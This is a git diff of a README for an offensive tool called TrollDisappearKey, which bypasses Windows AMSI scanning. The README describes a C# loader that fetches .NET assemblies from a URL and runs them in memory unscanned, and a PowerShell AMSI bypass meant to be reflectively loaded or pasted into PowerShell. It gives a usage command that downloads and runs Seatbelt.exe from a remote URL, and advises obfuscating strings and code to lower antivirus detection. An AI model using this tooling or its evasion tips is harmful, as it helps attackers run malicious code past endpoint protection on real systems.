@@ -1,6 +1,7 @@
 # TrollDisappearKey
-TrollDisappearKey   -> .cs code to compile into a .exe that can load .exe assemblies without amsi scanning taking place during assembly.load() \
-TrollDisappearKeyPS -> .cs code to compile into a .dll to reflectively load to bypass powershell amsi 
+TrollDisappearKey.cs   -> compile into a .exe that can load .exe assemblies without amsi scanning taking place during assembly.load() \
+TrollDisappearKeyPS.cs -> compile into a .dll to reflectively load to bypass powershell amsi \
+TrollDisappearKeyPS.cs -> copy paste into powershell 
 
 
 # How does it work?
@@ -45,9 +46,7 @@ TrollDisappearKey.exe <URL TO .EXE ASSEMBLY> <ARGUMENT1,ARGUMENT2>
 TrollDisappearKey.exe "https://github.com/Flangvik/SharpCollection/raw/refs/heads/master/NetFramework_4.7_x64/Seatbelt.exe" "AMSIProviders"
 ```
 ## Detections 
-Not too bad since zero effort to evade detection, there's tons of things to improve but i shall leave it to the reader \
-you can immediately drop it to maybe 5 by altering the ExecuteAssembly() function since its using standard code that's deemed malicious \
-Can rename/obufscate certain strings like the reg key path and void the use of certain API calls and improve the hook library further \
+Not too bad since zero effort to evade detection, there's tons of things to improve but i shall leave it to the reader. You can immediately drop it to maybe 5 by altering the ExecuteAssembly() function since its using standard code that's deemed malicious. Can rename/obufscate certain strings like the reg key path and void the use of certain API calls and improve the hook library further \
 ![Image](https://github.com/user-attachments/assets/e4c80f07-ddbc-4ed6-9ad0-c8e104931f90)
 
 
